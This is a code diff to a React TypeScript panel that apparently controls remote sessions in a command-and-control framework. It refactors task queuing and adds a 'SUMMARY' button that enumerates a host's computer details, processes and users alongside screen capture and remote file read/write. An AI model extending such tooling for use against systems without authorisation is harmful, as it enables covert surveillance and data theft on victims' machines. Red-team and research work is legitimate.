@@ -1,49 +1,37 @@
 import { useRef, useState } from 'react'
 import { api } from '../../api/client'
+import { useTaskQueue } from '../../hooks/useTaskQueue'
+import { type RichContent, detectOutputType } from './RichOutput'
 
 interface Props {
-  sessionId:    string
-  sleepSeconds: number
-  jitterPct:    number
-  onSleepUpdated?: () => void
+  sessionId:           string
+  sleepSeconds:        number
+  jitterPct:           number
+  onSleepUpdated?:     () => void
+  onOpenTaskBuilder:   () => void
+  onRichOutput?:       (content: RichContent) => void
 }
 
-export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpdated }: Props) {
+export function SessionActions({
+  sessionId,
+  sleepSeconds,
+  jitterPct,
+  onSleepUpdated,
+  onOpenTaskBuilder,
+  onRichOutput,
+}: Props) {
   const [busy, setBusy]             = useState<string | null>(null)
   const [screenshot, setScreenshot] = useState<string | null>(null)
   const [sleepVal, setSleepVal]     = useState(String(sleepSeconds))
   const [jitterVal, setJitterVal]   = useState(String(jitterPct))
   const fileInputRef                = useRef<HTMLInputElement>(null)
 
-  async function queueTask(type: string, args: Record<string, unknown>) {
-    const { data } = await api.post('/api/v1/tasks', {
-      session_id: sessionId,
-      type,
-      args: btoa(JSON.stringify(args)),
-    })
-    return data.task_id as string
-  }
-
-  async function pollOutput(taskId: string): Promise<Uint8Array | null> {
-    for (let i = 0; i < 60; i++) {
-      await sleep(2000)
-      try {
-        const { data } = await api.get(`/api/v1/tasks/${taskId}`)
-        if (data.status === 'complete' || data.status === 'failed') {
-          if (!data.output || data.status === 'failed') return null
-          return Uint8Array.from(atob(data.output), c => c.charCodeAt(0))
-        }
-      } catch {
-        // swallow transient errors and keep polling
-      }
-    }
-    return null
-  }
+  const { queueTask, pollOutput } = useTaskQueue(sessionId)
 
   async function takeScreenshot() {
     setBusy('screenshot')
     try {
-      const taskId = await queueTask('screenshot', {})
+      const taskId = await queueTask('collect', { method: 'screen-record', count: 1 })
       const bytes  = await pollOutput(taskId)
       if (!bytes) { alert('Screenshot failed or timed out.'); return }
       const blob = new Blob([bytes.buffer as ArrayBuffer], { type: 'image/bmp' })
@@ -60,7 +48,7 @@ export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpda
     if (!path) return
     setBusy('download')
     try {
-      const taskId  = await queueTask('upload', { path })
+      const taskId  = await queueTask('file', { method: 'read', path })
       const bytes   = await pollOutput(taskId)
       if (!bytes) { alert('Download failed or timed out.'); return }
       const filename = path.split(/[\\/]/).pop() || 'file'
@@ -93,7 +81,7 @@ export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpda
         reader.onerror = rej
         reader.readAsDataURL(file)
       })
-      const taskId = await queueTask('download', { path: dest, data })
+      const taskId = await queueTask('file', { method: 'write', path: dest, data })
       await pollOutput(taskId)
       alert(`Uploaded to ${dest}`)
     } catch (e: unknown) {
@@ -134,6 +122,37 @@ export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpda
     }
   }
 
+  async function quickSummary() {
+    setBusy('summary')
+    try {
+      const [tid1, tid2, tid3] = await Promise.all([
+        queueTask('enum', { method: 'computer' }),
+        queueTask('enum', { method: 'processes' }),
+        queueTask('enum', { method: 'users' }),
+      ])
+      const [b1, b2, b3] = await Promise.all([
+        pollOutput(tid1),
+        pollOutput(tid2),
+        pollOutput(tid3),
+      ])
+      const pairs: Array<[Uint8Array | null, string]> = [
+        [b1, 'enum/computer'],
+        [b2, 'enum/processes'],
+        [b3, 'enum/users'],
+      ]
+      for (const [bytes, lbl] of pairs) {
+        if (!bytes) continue
+        const rich = detectOutputType(bytes, lbl)
+        if (rich) onRichOutput?.(rich)
+        else onRichOutput?.({ kind: 'json', text: new TextDecoder().decode(bytes), label: lbl })
+      }
+    } catch (e: unknown) {
+      alert(`Summary error: ${(e as Error).message}`)
+    } finally {
+      setBusy(null)
+    }
+  }
+
   const sep = (
     <span style={{ color: 'var(--dm-border-hi)', userSelect: 'none', padding: '0 0.25rem' }}>│</span>
   )
@@ -157,6 +176,25 @@ export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpda
         className="flex items-center gap-1.5 px-3 py-1.5 flex-wrap flex-shrink-0"
         style={{ borderBottom: '1px solid var(--dm-border)', minHeight: '34px' }}
       >
+        <button
+          className="dm-action dm-go"
+          disabled={!!busy}
+          onClick={onOpenTaskBuilder}
+        >
+          TASKS
+        </button>
+
+        <button
+          className="dm-action dm-go"
+          disabled={!!busy}
+          onClick={quickSummary}
+          title="Quick enum: computer info"
+        >
+          {busy === 'summary' ? 'SUM…' : 'SUMMARY'}
+        </button>
+
+        {sep}
+
         <button
           className="dm-action dm-go"
           disabled={!!busy}
@@ -245,8 +283,4 @@ export function SessionActions({ sessionId, sleepSeconds, jitterPct, onSleepUpda
       )}
     </>
   )
-}
-
-function sleep(ms: number) {
-  return new Promise(r => setTimeout(r, ms))
 }
